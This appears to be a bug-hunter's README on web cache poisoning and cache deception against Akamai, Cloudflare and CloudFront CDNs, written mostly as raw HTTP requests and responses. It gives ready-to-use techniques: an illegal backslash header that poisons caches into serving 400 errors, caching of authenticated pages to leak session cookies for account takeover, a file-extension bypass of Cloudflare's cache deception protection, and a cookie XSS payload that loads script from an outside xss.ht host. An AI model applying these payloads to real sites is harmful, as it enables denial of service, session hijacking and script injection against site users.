# Test Cache Poisoing

**Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.**

## Case 1:

If the applicatoin doen not have a login functionality, but using Akami CDN, You can test this method:

    - request:
    raw:  
         GET /xx/xxx/xxx/?param HTTP/1.1
         Host: hostname
         User-Agnet: xyz....
         Accept: text/html,applicaton/xhtml, applicatoin/xml.....
         Accept-Encoding: gzip, deflate
         Upgrade-Isecure-Requests: 1
         Te: trailers
         Connection: close

         - Check if the server is caching normal requests or not (You can tell this by the response header "Server-Timing: cnd-cache; desc=HIT")
         
     response:
         HTTP/2 200 OK
         ...
         Server-Timing: cnd-cahce; desc=HIT
         ...
        
         - Add an Illegal Request Header into the requst body.
         GET /xx/xx/xxx/param HTTP/2
         Host: hostname
         \:
         User-Agnet: xyz....
         Accept: ...
         ....
         
         - If the response was successfully cached, when you open the URL on any browser, you should get 400 Bad Request
         
         
## Case 2:
**If the Applicatoin does have a Login Functionality**
- Create an account
- Test Case1
- Check if any sensitve information is doclosed in any page (e.g: session Token)
- Send the request to Repeater
- Add a Cacheable Extention (.js, .css) at the end of the URL and see if it gives 200 OK Response
- Open the Modified URL using your authenticated Account:
- Open the Same URL using curl or Private Web Browser window.
```bash
curl "https://target.site/?param=1" --compressed | grep -i 'cookies'
```
- If the Token was successfully cached, you should see the Token in the response
### If the Application is using Cloudflare CND
**Illegal header won't work*, and most Cloudflare Cusotmer using Cache Deception Armor*
**_Youc can bypass this protection using .avif file extension while is really unknown extenstion file._**

### Cache Deception TO Account Takeover:
     All cookies (even HTTPonly ones) are being disclosed in https://target.com/app/account/1.js
     if an authenticated user visit this URL all their cookies will be stored in the cache
     An attacker can then extract the cookie and hijack their session.

### TIps & Trick
- In some Applicatoin, if you add a semicolon (;) before the extension it may give you a 200 OK response
  xxx/xxx/xxx/;.js 
  HTTP/2 200 OK
  
 
 ## Case 3: Cache Poisoning to DoS:
 **In Akamai CND, if we send a backslash \ as a header, the server will respond with ```400 Bad Request``` Response**
     request:
 
     raw: 
        GET /products/xxx/xxxx/xxx/?test HTTP/2
        Host: www.host.com
        \: 
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        Te: trailers

   Response:
        
        HTTP/2 400 Bad Request
        Content-Type: text/html;charset=iso-8859-1
        Content-Length: 70
        Cache-Control: max-age=297
        Expires: Thu, 21 Jul 2022 16:17:54 GMT
        Date: Thu, 21 Jul 2022 16:12:57 GMT
        Server-Timing: cdn-cache; desc=HIT
        Server-Timing: edge; dur=32
        Server-Timing: origin; dur=147
        Strict-Transport-Security: max-age=86400
        Ak-Uuid: 0.bc85d817.1658419977.1592c61

**This becomes an issue when the site uses caching servers. Sites typically only caches javascript, css and other files, but when sites like www.host.com also caches normal responses like**

_www.host.com/product/*_

_www.host.com/*_

etc... It become a very impactful bug:

## Case 4: Cache Poisoing to Stored XSS

***Try in cookies if cookies body reflecting in response body: Try Stored XSSS, BXSS**
 
**Try for Blind XSS on Cookie if target blocking try jquery payload ```$.getScript``` will help you.**
request:

        GET /xxxx/xx-xx.otf?triagethiss HTTP/2
        Host: www.host.com
        Cookie: n_vis=xssx'*$.getScript`//593.xss.ht`//;
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-xss,en;q=0.5
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        Te: trailers

  response:
  
        <script>
        ...
        Visitor.id='xssx'*$.getScript`//593.xss.ht`//;
        ....
        </script>

### Tips & Tricks:
**Test for XSS on any Request Heder, cookies, Custom Header, X-Forwarded-*  Header**

## Attacking AWS Cloudfront CDN
**If you see anywhere in response or xml Amazon error bucket stuff 404**
_Response:_
```
HTTP/2 200 Ok
Date: Thu, 01 Dec 2022 07:51:01 GMT
X-Cache: Hit from cloudfront
Via: 1.1 2dd59b0ea355cb92a87e9e385032622a.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: JFK50-P8
X-Amz-Cf-Id: KQBmzmGEBmmIfprhoM0VXi7RjmiDnGkXkj-_-uJRAFKhCdNuNYVNBw==
Age: 1082260 https://link.medium.com/D65XUelUlwb
```
Try with header... 
  ```X-Amz-Server-Side-Encryption: Anything ```

```
GET /?test HTTP/2

Host: ██████

X-Amz-Server-Side-Encryption: AES256xss

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Upgrade-Insecure-Requests: 1

Te: trailers https://link.medium.com/D65XUelUlwb 
```
  
_Response should 400 code_
```
HTTP/2 400 Bad Request

Date: Thu, 01 Dec 2022 07:51:01 GMT

Content-Type: application/xml

Cache-Control: public,max-age=600

X-Ua-Compatible: IE=edge,chrome=1

X-Amz-Cf-Pop: JFK50-P8

X-Amz-Cf-Id: oEWROikzmcKM5bviUrsPwyFQTbRzS8S7l_-kzH2NSLbChDsc9_K3yA==

Age: 4 https://link.medium.com/D65XUelUlwb 
```
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  

